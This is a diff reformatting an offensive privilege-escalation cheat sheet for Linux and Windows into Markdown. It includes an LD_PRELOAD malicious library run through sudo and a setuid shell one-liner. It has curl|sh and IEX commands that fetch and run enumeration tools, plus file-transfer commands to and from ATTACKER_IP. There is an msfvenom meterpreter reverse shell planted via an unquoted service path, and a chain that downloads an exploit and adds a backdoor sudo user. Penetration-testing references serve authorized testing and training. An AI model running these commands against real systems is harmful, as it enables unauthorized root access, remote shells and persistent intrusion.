@@ -898,48 +898,50 @@ __attribute__((constructor)) void init() {
 
 - **Privilege escalation via capabilities:**
 
-  · `cap_dac_override` on `tar` or `cp`: Can read any file
-  · `cap_setuid` on `python: python -c 'import os; os.setuid(0); os.system("/bin/sh")'`
-  · `cap_sys_ptrace` on `gdb`: Can attach to root processes
-  ·`cap_net_raw `on `tcpdump:` Can capture network traffic
+  - `cap_dac_override` on `tar` or `cp`: Can read any file
+  - `cap_setuid` on `python: python -c 'import os; os.setuid(0); os.system("/bin/sh")'`
+  - `cap_sys_ptrace` on `gdb`: Can attach to root processes
+  - `cap_net_raw `on `tcpdump:` Can capture network traffic
 
 ---
 
-30. Linux Environment Variables
+### 30. Linux Environment Variables
 
-Command Purpose
-env Show all environment variables
-set Show all environment and shell variables
-printenv Print environment variables
-printenv PATH Show PATH variable
-echo $LD_PRELOAD Show LD_PRELOAD variable
-echo $LD_LIBRARY_PATH Show LD_LIBRARY_PATH variable
-echo $PATH Show PATH variable
-echo $HOME Show home directory
-echo $USER Show current username
-echo $SHELL Show current shell
-echo $TMPDIR Show temporary directory
-cat ~/.bashrc User's bash configuration
-cat ~/.profile User's profile script
-cat ~/.bash_profile User's bash profile (login shell)
-cat ~/.zshrc User's zsh configuration
-cat /etc/environment System-wide environment variables (systemd systems)
-cat /etc/profile System-wide profile script
-cat /etc/bash.bashrc System-wide bashrc (Debian/Ubuntu)
+|Command| Purpose|
+|-----|-----|
+|`env`| Show all environment variables|
+|`set`| Show all environment and shell variables|
+|`printenv`| Print environment variables|
+|`printenv PATH`| Show PATH variable|
+|`echo $LD_PRELOAD`| Show LD_PRELOAD variable|
+|`echo $LD_LIBRARY_PATH`| Show LD_LIBRARY_PATH variable|
+|`echo $PATH`| Show PATH variable|
+|`echo $HOME`| Show home directory|
+|`echo $USER`| Show current username|
+|`echo $SHELL`| Show current shell|
+|`echo $TMPDIR`| Show temporary directory|
+|`cat ~/.bashrc`| User's bash configuration|
+|`cat ~/.profile`| User's profile script|
+|`cat ~/.bash_profile`| User's bash profile (login shell)|
+|`cat ~/.zshrc`| User's zsh configuration|
+|`cat /etc/environment`|System-wide environment variables (systemd systems)|
+|`cat /etc/profile`|System-wide profile script|
+|`cat /etc/bash.bashrc`| System-wide bashrc (Debian/Ubuntu)|
 
-Dangerous environment variable configurations:
+- **Dangerous environment variable configurations:**
 
-· LD_PRELOAD pointing to a malicious library
-· LD_LIBRARY_PATH including writable directories
-· PATH including writable directories before legitimate paths
-· TMPDIR pointing to a writable directory (if used by SUID binaries)
-· PYTHONPATH pointing to malicious Python modules
-· PERL5LIB pointing to malicious Perl modules
+  - LD_PRELOAD pointing to a malicious library
+  - LD_LIBRARY_PATH including writable directories
+  - PATH including writable directories before legitimate paths
+  - TMPDIR pointing to a writable directory (if used by SUID binaries)
+  - PYTHONPATH pointing to malicious Python modules
+  - PERL5LIB pointing to malicious Perl modules
 
-Exploitation example (LD_PRELOAD with sudo):
+- **Exploitation example (LD_PRELOAD with sudo):**
+
+   - Create malicious library
 
 ```bash
-# Create malicious library
 cat << EOF > /tmp/evil.c
 #include <stdio.h>
 #include <stdlib.h>
@@ -952,212 +954,266 @@ __attribute__((constructor)) void init() {
 }
 EOF
 gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
+```
+  -  Run with LD_PRELOAD (if not filtered)
 
-# Run with LD_PRELOAD (if not filtered)
+```bash
 sudo LD_PRELOAD=/tmp/evil.so /usr/bin/sudo
 ```
 
 ---
 
-General
+## General
 
-31. Tools
+### 31. Tools
 
-Linux Enumeration Scripts
+#### Linux Enumeration Scripts
 
-Tool Command Purpose
-LinPEAS curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh Automated Linux enumeration
-LinEnum curl -L https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh \| sh Linux enumeration script
-linux-exploit-suggester curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh \| sh Suggest kernel exploits
-Linux Smart Enumeration curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh \| sh Smart enumeration with categories
-unix-privesc-check curl -L https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check \| sh Unix privilege escalation check
+| Tool | Command | Purpose |
+|------|---------|---------|
+| **LinPEAS** | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` | Automated Linux enumeration |
+| **LinEnum** | `curl -L https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh \| sh` | Linux enumeration script |
+| **linux-exploit-suggester** | `curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh \| sh` | Suggest kernel exploits |
+| **Linux Smart Enumeration** | `curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh \| sh` | Smart enumeration with categories |
+| **unix-privesc-check** | `curl -L https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check \| sh` | Unix privilege escalation check |
 
-Windows Enumeration Scripts
+#### Windows Enumeration Scripts
 
-Tool Command Purpose
-WinPEAS Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.exe -OutFile winPEAS.exe && ./winPEAS.exe Automated Windows enumeration
-WinPEAS (PowerShell) IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1"); winPEAS PowerShell version
-PowerUp IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"); Invoke-AllChecks PowerShell privilege escalation checks
-JAWS Invoke-WebRequest https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1 -OutFile jaws.ps1; powershell -exec bypass -File jaws.ps1 Just Another Windows Enumeration Script
-Seatbelt Invoke-WebRequest https://github.com/GhostPack/Seatbelt/raw/master/Seatbelt.exe -OutFile Seatbelt.exe; ./Seatbelt.exe -group=all C# enumeration tool
-SharpUp Invoke-WebRequest https://github.com/GhostPack/SharpUp/raw/master/SharpUp.exe -OutFile SharpUp.exe; ./SharpUp.exe C# privilege escalation checks
-Watson Invoke-WebRequest https://github.com/rasta-mouse/Watson/raw/master/Watson.exe -OutFile Watson.exe; ./Watson.exe Windows vulnerability finder
+| Tool | Command | Purpose |
+|------|---------|---------|
+| **WinPEAS** | `Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.exe -OutFile winPEAS.exe && ./winPEAS.exe` | Automated Windows enumeration |
+| **WinPEAS (PowerShell)** | `IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1"); winPEAS` | PowerShell version |
+| **PowerUp** | `IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"); Invoke-AllChecks` | PowerShell privilege escalation checks |
+| **JAWS** | `Invoke-WebRequest https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1 -OutFile jaws.ps1; powershell -exec bypass -File jaws.ps1` | Just Another Windows Enumeration Script |
+| **Seatbelt** | `Invoke-WebRequest https://github.com/GhostPack/Seatbelt/raw/master/Seatbelt.exe -OutFile Seatbelt.exe; ./Seatbelt.exe -group=all` | C# enumeration tool |
+| **SharpUp** | `Invoke-WebRequest https://github.com/GhostPack/SharpUp/raw/master/SharpUp.exe -OutFile SharpUp.exe; ./SharpUp.exe` | C# privilege escalation checks |
+| **Watson** | `Invoke-WebRequest https://github.com/rasta-mouse/Watson/raw/master/Watson.exe -OutFile Watson.exe; ./Watson.exe` | Windows vulnerability finder |
 
-Privilege Escalation Tools
+#### Privilege Escalation Tools
 
-Tool Purpose
-pspy Monitor processes without root permissions
-pwnkit CVE-2021-4034 exploit
-dirtycow CVE-2016-5195 exploit
-dirtypipe CVE-2022-0847 exploit
-GTFOBins Website for SUID/sudo binary exploitation
-LOLBAS Website for Windows binaries exploitation
-Mimikatz Windows credential dumping
-Incognito Token manipulation
-JuicyPotato Windows privilege escalation via COM
+| Tool | Purpose |
+|------|---------|
+| **pspy** | Monitor processes without root permissions |
+| **pwnkit** | CVE-2021-4034 exploit |
+| **dirtycow** | CVE-2016-5195 exploit |
+| **dirtypipe** | CVE-2022-0847 exploit |
+| **GTFOBins** | Website for SUID/sudo binary exploitation |
+| **LOLBAS** | Website for Windows binaries exploitation |
+| **Mimikatz** | Windows credential dumping |
+| **Incognito** | Token manipulation |
+| **JuicyPotato** | Windows privilege escalation via COM |
 
-32. Transferring Files
+### 32. Transferring Files
 
-Linux to Linux
+#### Linux to Linux
 
-Method Command (Listener) Command (Sender)
-Python HTTP server python3 -m http.server 8000 (on attacker) wget http://ATTACKER_IP:8000/file
-Python HTTP server (alt) python3 -m http.server 8000 curl -O http://ATTACKER_IP:8000/file
-SCP N/A scp file user@TARGET_IP:/path
-Netcat nc -lvnp 4444 > file nc TARGET_IP 4444 < file
-rsync rsync -av --progress user@TARGET_IP:/path/file . rsync -av --progress file user@TARGET_IP:/path
-base64 encoding echo "base64_string" \| base64 -d > file base64 -w 0 file (copy the string)
+| Method | Command (Listener) | Command (Sender) |
+|--------|-------------------|------------------|
+| **Python HTTP server** | `python3 -m http.server 8000` (on attacker) | `wget http://ATTACKER_IP:8000/file` |
+| **Python HTTP server (alt)** | `python3 -m http.server 8000` | `curl -O http://ATTACKER_IP:8000/file` |
+| **SCP** | N/A | `scp file user@TARGET_IP:/path` |
+| **Netcat** | `nc -lvnp 4444 > file` | `nc TARGET_IP 4444 < file` |
+| **rsync** | `rsync -av --progress user@TARGET_IP:/path/file .` | `rsync -av --progress file user@TARGET_IP:/path` |
+| **base64 encoding** | `echo "base64_string" \| base64 -d > file` | `base64 -w 0 file` (copy the string) |
 
-Windows to Windows / Windows to Linux
+#### Windows to Windows / Windows to Linux
 
-Method Command
-PowerShell (Internet) Invoke-WebRequest http://ATTACKER_IP:8000/file -OutFile file
-PowerShell (Internet alt) wget http://ATTACKER_IP:8000/file -OutFile file
-PowerShell (WebClient) (New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/file", "file")
-PowerShell (base64) Encode: $b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("file")); Write-Host $b64 (copy the string, then decode on Linux: echo "base64_string" \| base64 -d > file)
-certutil certutil -urlcache -f http://ATTACKER_IP:8000/file file
-bitsadmin bitsadmin /transfer job /download /priority high http://ATTACKER_IP:8000/file C:\path\to\file
-SCP (Windows with WinSCP) N/A
-Netcat (Windows with nc.exe) nc.exe ATTACKER_IP 4444 > file (listener: nc -lvnp 4444 < file)
-SMB copy \\ATTACKER_IP\share\file file (requires attacker SMB server)
+| Method | Command |
+|--------|---------|
+| **PowerShell (Internet)** | `Invoke-WebRequest http://ATTACKER_IP:8000/file -OutFile file` |
+| **PowerShell (Internet alt)** | `wget http://ATTACKER_IP:8000/file -OutFile file` |
+| **PowerShell (WebClient)** | `(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/file", "file")` |
+| **PowerShell (base64)** | Encode: `$b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("file")); Write-Host $b64` (copy the string, then decode on Linux: `echo "base64_string" \| base64 -d > file`) |
+| **certutil** | `certutil -urlcache -f http://ATTACKER_IP:8000/file file` |
+| **bitsadmin** | `bitsadmin /transfer job /download /priority high http://ATTACKER_IP:8000/file C:\path\to\file` |
+| **SCP (Windows with WinSCP)** | N/A |
+| **Netcat (Windows with nc.exe)** | `nc.exe ATTACKER_IP 4444 > file` (listener: `nc -lvnp 4444 < file`) |
+| **SMB** | `copy \\ATTACKER_IP\share\file file` (requires attacker SMB server) |
 
-Linux to Windows
+#### Linux to Windows
 
-Method Command
-PowerShell (from Linux server) Invoke-WebRequest http://ATTACKER_IP:8000/file -OutFile file (same as above)
-Python HTTP server (on Linux) python3 -m http.server 8000 (attacker)
-wget.exe (if installed) wget http://ATTACKER_IP:8000/file -OutFile file
+| Method | Command |
+|--------|---------|
+| **PowerShell (from Linux server)** | `Invoke-WebRequest http://ATTACKER_IP:8000/file -OutFile file` (same as above) |
+| **Python HTTP server (on Linux)** | `python3 -m http.server 8000` (attacker) |
+| **wget.exe (if installed)** | `wget http://ATTACKER_IP:8000/file -OutFile file` |
 
-33. Troubleshooting
+### 33. Troubleshooting
 
-Problem Likely Cause Fix
-Linux: Command not found Tool not installed Install the required package (apt install or yum install)
-Linux: Permission denied Need elevated privileges Use sudo or switch to root
-Linux: find / -writable too slow Scanning entire filesystem Limit to specific directories: find /home /tmp /var -writable
-Linux: sudo -l asks for password User requires password for sudo Check if NOPASSWD is not set for your commands
-Linux: ldd shows "not found" Library missing Install the required library or find alternative binary
-Linux: Capabilities not found getcap not installed Install libcap2-bin package
-Linux: Container escape failed Container not privileged or socket not mounted Check with capsh --print and find / -name docker.sock
-Windows: Command not recognized Not in PATH or not installed Use full path or install the tool
-Windows: PowerShell script won't run Execution policy blocked Run with powershell -exec bypass
-Windows: net view fails Not on domain or no permission Use alternative tools (BloodHound, SharpHound, nltest)
-Windows: wmic not found Not available on this Windows version Use PowerShell alternatives
-Windows: accesschk.exe not found Sysinternals tool not downloaded Download from Microsoft website
-Cannot write to file Insufficient permissions Check file ownership with ls -la, try to escalate privileges
-SUID binary doesn't give root The SUID binary is not owned by root or doesn't run with root privileges Check with ls -la for ownership
-Cron job not executing Cron service not running or permissions issue Check with systemctl status cron
+| Problem | Likely Cause | Fix |
+|---------|--------------|-----|
+| **Linux: Command not found** | Tool not installed | Install the required package (`apt install` or `yum install`) |
+| **Linux: Permission denied** | Need elevated privileges | Use `sudo` or switch to root |
+| **Linux: `find / -writable` too slow** | Scanning entire filesystem | Limit to specific directories: `find /home /tmp /var -writable` |
+| **Linux: `sudo -l` asks for password** | User requires password for sudo | Check if `NOPASSWD` is not set for your commands |
+| **Linux: `ldd` shows "not found"** | Library missing | Install the required library or find alternative binary |
+| **Linux: Capabilities not found** | `getcap` not installed | Install `libcap2-bin` package |
+| **Linux: Container escape failed** | Container not privileged or socket not mounted | Check with `capsh --print` and `find / -name docker.sock` |
+| **Windows: Command not recognized** | Not in PATH or not installed | Use full path or install the tool |
+| **Windows: PowerShell script won't run** | Execution policy blocked | Run with `powershell -exec bypass` |
+| **Windows: `net view` fails** | Not on domain or no permission | Use alternative tools (BloodHound, SharpHound, nltest) |
+| **Windows: `wmic` not found** | Not available on this Windows version | Use PowerShell alternatives |
+| **Windows: `accesschk.exe` not found** | Sysinternals tool not downloaded | Download from Microsoft website |
+| **Cannot write to file** | Insufficient permissions | Check file ownership with `ls -la`, try to escalate privileges |
+| **SUID binary doesn't give root** | The SUID binary is not owned by root or doesn't run with root privileges | Check with `ls -la` for ownership |
+| **Cron job not executing** | Cron service not running or permissions issue | Check with `systemctl status cron` |
 
-34. Real-World Workflows
+### 34. Real-World Workflows
 
-Workflow 1: Initial Linux Enumeration (Low Priv Shell)
+#### Workflow 1: Initial Linux Enumeration (Low Priv Shell)
+
+- Step 1: Basic system info
 
 ```bash
-# Step 1: Basic system info
 whoami
 id
 uname -a
 cat /etc/os-release
 sudo -l 2>/dev/null
+```
+- Step 2: Find SUID/SGID binaries
 
-# Step 2: Find SUID/SGID binaries
+```bash
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -2000 -type f 2>/dev/null
+```
+- Step 3: Check cron jobs
 
-# Step 3: Check cron jobs
+```bash
 cat /etc/crontab 2>/dev/null
 ls -la /etc/cron* 2>/dev/null
+```
+- Step 4: Check for writable files
 
-# Step 4: Check for writable files
+```bash
 find / -writable -type f 2>/dev/null | grep -v proc | head -20
+```
+- Step 5: Run automated enumeration
 
-# Step 5: Run automated enumeration
+```bash
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
-Workflow 2: Initial Windows Enumeration (Low Priv Shell)
+#### Workflow 2: Initial Windows Enumeration (Low Priv Shell)
 
-```cmd
-# Step 1: Basic system info
+
+- Step 1: Basic system info
+
+```bash
 whoami
 whoami /priv
 whoami /groups
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+```
 
-# Step 2: User and group enumeration
+- Step 2: User and group enumeration
+
+```bash
 net user
 net localgroup Administrators
+```
 
-# Step 3: Service enumeration
+- Step 3: Service enumeration
+```bash
 sc query state= all | findstr SERVICE_NAME
 wmic service get name,pathname,startname | findstr /i "LocalSystem"
+```
 
-# Step 4: Scheduled tasks
+- Step 4: Scheduled tasks
+```bash
 schtasks /query /fo LIST /v | findstr /i "task to run"
+```
 
-# Step 5: Run automated enumeration
+- Step 5: Run automated enumeration
+```bash
 powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
 ```
 
-Workflow 3: Linux Privilege Escalation via SUID Binary
+#### Workflow 3: Linux Privilege Escalation via SUID Binary
 
+- Step 1: Find SUID binaries
 ```bash
-# Step 1: Find SUID binaries
 find / -perm -4000 -type f 2>/dev/null
+```
 
-# Step 2: Check if `find` has SUID
+- Step 2: Check if `find` has SUID
+```bash
 ls -la /usr/bin/find
+```
 
-# Step 3: Exploit `find` SUID
+- Step 3: Exploit `find` SUID
+```bash
 /usr/bin/find / -exec /bin/sh \; -quit
+```
 
-# Step 4: Verify root access
+- Step 4: Verify root access
+```bash
 whoami
 ```
 
-Workflow 4: Windows Privilege Escalation via Unquoted Service Path
+#### Workflow 4: Windows Privilege Escalation via Unquoted Service Path
 
-```cmd
-# Step 1: Find services with unquoted paths
+- Step 1: Find services with unquoted paths
+```bash
 wmic service get name,pathname | findstr /i /v "C:\\Windows\\" | findstr /i "\" "
+```
 
-# Step 2: Check if you can write to the directory
+- Step 2: Check if you can write to the directory
+```bash
 dir C:\Program Files\My Service\
+```
 
-# Step 3: Compile and upload malicious service executable
-# (on attacker machine) msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o service.exe
+- Step 3: Compile and upload malicious service executable (on attacker machine) 
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o service.exe
+```
 
-# Step 4: Place malicious executable
+- Step 4: Place malicious executable
+```bash
 copy service.exe "C:\Program Files\My Service\Service.exe"
+```
 
-# Step 5: Restart the service
+- Step 5: Restart the service
+```bash
 sc stop SERVICE_NAME
 sc start SERVICE_NAME
-
-# Step 6: Get reverse shell as SYSTEM
 ```
 
-Workflow 5: Full Linux Privilege Escalation Chain
+- Step 6: Get reverse shell as SYSTEM
 
+
+#### Workflow 5: Full Linux Privilege Escalation Chain
+
+- Phase 1: Initial foothold (low priv shell)
+- Phase 2: Enumeration (manual + LinPEAS)
 ```bash
-# Phase 1: Initial foothold (low priv shell)
-# Phase 2: Enumeration (manual + LinPEAS)
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
 
-# Phase 3: Identify vector (e.g., outdated kernel)
+- Phase 3: Identify vector (e.g., outdated kernel)
+```bash
 uname -r
+```
 
-# Phase 4: Download exploit from attacker machine
+- Phase 4: Download exploit from attacker machine
+```bash
 wget http://ATTACKER_IP:8000/exploit.sh
 chmod +x exploit.sh
+```
 
-# Phase 5: Run exploit
+- Phase 5: Run exploit
+```bash
 ./exploit.sh
+```
 
-# Phase 6: Verify root
+- Phase 6: Verify root
+```bash
 whoami
 id
+```
 
-# Phase 7: Persistence (add user)
+- Phase 7: Persistence (add user)
+```bash
 useradd -m -s /bin/bash backdoor
 echo "backdoor:password" | chpasswd
 usermod -aG sudo backdoor
@@ -1165,6 +1221,27 @@ usermod -aG sudo backdoor
 
 ---
 
-License
+### License
 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
